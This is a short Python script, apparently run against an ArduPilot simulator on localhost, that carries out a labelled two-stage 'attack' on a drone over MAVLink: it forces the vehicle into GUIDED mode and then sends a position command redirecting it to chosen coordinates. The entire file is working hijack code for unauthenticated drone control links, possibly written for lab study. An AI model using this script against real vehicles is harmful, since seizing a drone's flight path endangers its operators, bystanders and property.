from pymavlink import mavutil
import time

# --- Configuration ---
CONNECTION_STRING = 'udp:127.0.0.1:14550'
ATTACK_LAT = -35.3600  # Example Latitude
ATTACK_LON = 149.1600  # Example Longitude
ATTACK_ALT = 30        # Example Altitude
WAIT_BEFORE_ATTACK = 25
GUIDED_MODE_COPTER = 4 # The flight mode number for GUIDED in ArduCopter

# --- Main Attack Logic ---
print(f"Connecting to vehicle on: {CONNECTION_STRING}")
try:
    master = mavutil.mavlink_connection(CONNECTION_STRING)
except Exception as e:
    print(f"Failed to connect: {e}")
    exit()

print("Waiting for heartbeat...")
master.wait_heartbeat()
print(f"Heartbeat from system (system {master.target_system} component {master.target_component})")

print(f"Waiting {WAIT_BEFORE_ATTACK} seconds before launching attack...")
time.sleep(WAIT_BEFORE_ATTACK)

# --- STAGE 1: Force drone into GUIDED mode ---
print("\n!!! ATTACK STAGE 1: Forcing vehicle into GUIDED mode !!!")
master.mav.command_long_send(
    master.target_system,
    master.target_component,
    mavutil.mavlink.MAV_CMD_DO_SET_MODE,
    0,
    1,  # Custom mode
    GUIDED_MODE_COPTER,
    0, 0, 0, 0, 0  # Unused parameters
)

# --- NEW: Loop and verify the mode change from HEARTBEAT messages ---
print("Waiting for mode change confirmation...")
mode_changed = False
for _ in range(10): # Try for a few seconds
    msg = master.recv_match(type='HEARTBEAT', blocking=True, timeout=1)
    if msg and msg.custom_mode == GUIDED_MODE_COPTER:
        print("Mode change to GUIDED successful!")
        mode_changed = True
        break
    time.sleep(0.5)

if not mode_changed:
    print("Mode change failed or timed out. Aborting attack.")
    exit()

time.sleep(1) # Give the vehicle a moment to stabilize in the new mode

# --- STAGE 2: Send the new destination using a direct position command ---
print("\n!!! ATTACK STAGE 2: Sending direct SET_POSITION_TARGET_GLOBAL_INT command !!!")
master.mav.set_position_target_global_int_send(
    0, # time_boot_ms (not used)
    master.target_system,
    master.target_component,
    mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT, # frame
    0b0000111111111000, # type_mask (only position matters)
    int(ATTACK_LAT * 1e7), # lat_int
    int(ATTACK_LON * 1e7), # lon_int
    ATTACK_ALT, # alt
    0, 0, 0, # velocity (not used)
    0, 0, 0, # acceleration (not used)
    0, 0)    # yaw, yaw_rate (not used)


print(f"Attack commands sent! Drone should be flying to LAT:{ATTACK_LAT}, LON:{ATTACK_LON}")
print("Observe the behavior in QGroundControl.")

